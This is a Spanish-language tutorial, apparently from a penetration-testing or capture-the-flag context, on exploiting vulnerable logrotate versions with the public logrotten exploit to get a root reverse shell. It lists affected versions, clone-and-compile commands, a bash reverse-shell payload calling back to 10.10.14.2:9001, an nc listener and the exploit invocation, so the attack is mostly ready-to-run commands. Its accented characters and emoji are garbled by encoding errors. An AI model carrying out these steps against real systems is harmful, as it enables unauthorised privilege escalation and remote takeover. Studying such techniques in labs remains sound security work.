# Explotaci贸n de **logrotate** con **logrotten**

##  Introducci贸n
Los sistemas Linux generan grandes cantidades de archivos de registro (**logs**). Para evitar que llenen el disco, se utiliza la herramienta **logrotate**, que archiva o elimina registros antiguos.  
Si los registros no se gestionan correctamente, pueden ocupar demasiado espacio y dificultar la b煤squeda de informaci贸n cr铆tica.

##  Objetivo
Explotar una versi贸n vulnerable de **logrotate** para obtener una **shell reversa** como usuario privilegiado o root.

##  Requisitos
Para explotar **logrotate**, se deben cumplir las siguientes condiciones:
1. Tener **permisos de escritura** en los archivos de log.
2. **logrotate** debe ejecutarse como un usuario privilegiado o **root**.
3. La versi贸n del sistema debe ser **vulnerable**. Versiones afectadas:
   - **3.8.6**
   - **3.11.0**
   - **3.15.0**
   - **3.18.0**

##  Explotaci贸n con **logrotten**
Si se cumplen los requisitos, podemos usar un exploit prefabricado llamado **logrotten**.  

### **1锔 Descarga y compilaci贸n del exploit**
Si el sistema de destino permite la compilaci贸n, podemos hacerlo directamente all铆. De lo contrario, compilamos en una m谩quina con un kernel similar y transferimos el binario.

```sh
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

### **2锔 Creaci贸n del payload**

Generamos un payload con una **shell reversa** que se conectar谩 a nuestra m谩quina atacante (**10.10.14.2:9001** en este caso).

```bash
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

### **3锔 Identificaci贸n de configuraci贸n vulnerable**

Verificamos si **logrotate** tiene la opci贸n `create`, lo que significa que podemos usar el exploit con este m茅todo:

```bash
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

```

ejemplo de salida:
	 create
Dado que la opci贸n `create` est谩 habilitada, adaptamos el exploit en consecuencia.

### **4锔 Configuraci贸n del listener en nuestra m谩quina**

Antes de ejecutar el exploit, iniciamos un **listener** en nuestra m谩quina para recibir la conexi贸n:
```bash
nc -nlvp 9001

```
### **5锔 Ejecuci贸n del exploit**

Ejecutamos el exploit indicando el payload y el archivo de log vulnerable:
```bash
./logrotten -p ./payload /tmp/tmp.log

```

Si la explotaci贸n es exitosa, recibiremos una conexi贸n en nuestro listener